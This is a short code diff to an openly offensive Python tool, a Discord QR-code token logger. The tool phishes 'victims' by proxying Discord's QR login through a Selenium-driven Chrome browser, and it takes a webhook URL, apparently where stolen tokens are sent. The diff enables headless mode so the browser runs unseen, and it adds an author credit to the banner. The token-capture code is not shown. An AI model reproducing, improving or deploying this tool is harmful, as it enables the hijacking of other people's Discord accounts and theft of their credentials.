@@ -39,7 +39,7 @@ from cairosvg import svg2png
 def main(webhook_url: str) -> None:
     proxy_value = Write.Input("\n[*] Does the victim live in the same country as you otherwise use a proxy [IP:PORT] -> ", Colors.green_to_cyan, interval=0.01)
     opts = webdriver.ChromeOptions()
-    #opts.add_argument('--headless')
+    opts.add_argument('--headless')
     opts.add_argument('--silent')
     opts.add_argument('start-maximized')
     opts.add_argument('--disable-gpu')
@@ -212,11 +212,11 @@ if __name__ == "__main__":
             MenuItem('Quit', window_state)
         ))
         pystray_icon.icon.run()
-    System.Title('QR DISCORD LOGIN - By Lemon.-_-.#3714')
+    System.Title('QR DISCORD LOGIN - By Lemon.-_-.#3714 (mouadessalim)')
     System.Size(140, 35)
     print(Colorate.Horizontal(Colors.cyan_to_green, Center.XCenter(BANNER), 1))
     print(Colorate.Horizontal(Colors.rainbow, Center.GroupAlign(Box.DoubleCube(
-        "By Lemon.-_-.#3714")), 1))
+        "By Lemon.-_-.#3714 (mouadessalim)")), 1))
     print(Colorate.Horizontal(Colors.rainbow, Box.Lines(
         "https://github.com/9P9/Discord-QR-Token-Logger").replace('ቐ', "$"), 1), "\n")
     confir = Write.Input(
